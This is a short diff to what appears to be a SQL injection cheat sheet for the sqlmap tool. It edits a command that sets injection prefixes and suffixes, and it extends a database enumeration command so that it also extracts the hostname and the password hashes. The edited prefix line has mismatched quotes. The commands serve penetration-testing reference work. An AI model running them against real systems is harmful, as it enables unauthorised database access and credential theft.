@@ -438,10 +438,10 @@ sqlmap -r req.txt --level=5 -v 3
 sqlmap -r req.txt --level=5 --string="Welcome" -v 3 # Check webpage for successful string!
 
 # Specifying a prefix or suffix. Test different payloads wotfor correct prefix
-sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+sqlmap -u "www.example.com/?q=test" --prefix='%'))' --suffix='-- -'         '# May need single/double quotes for prefix/suffix...
 
 # Basic DB enumeration
-sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba --hostname --passwords
 
 # Table enumeration
 sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
